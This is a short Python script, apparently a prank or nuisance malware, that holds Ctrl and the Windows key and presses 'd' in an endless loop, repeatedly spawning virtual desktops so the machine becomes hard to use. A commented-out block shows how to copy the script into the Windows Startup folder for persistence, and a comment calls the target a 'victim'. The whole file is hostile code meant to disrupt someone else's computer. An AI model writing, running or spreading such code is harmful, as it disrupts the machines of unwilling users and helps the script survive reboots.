import keyboard
import time
'''(optional move to startup):
import shutil
import os
shutil.move(__file__,os.environ["appdata"]+"\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"+__file__.split("\\")[-1])'''
keyboard.press("ctrl")
keyboard.press("cmd")
while True:
  keyboard.send("d")
  time.sleep(0.1) #So victim can see that their computer is f**ked up.
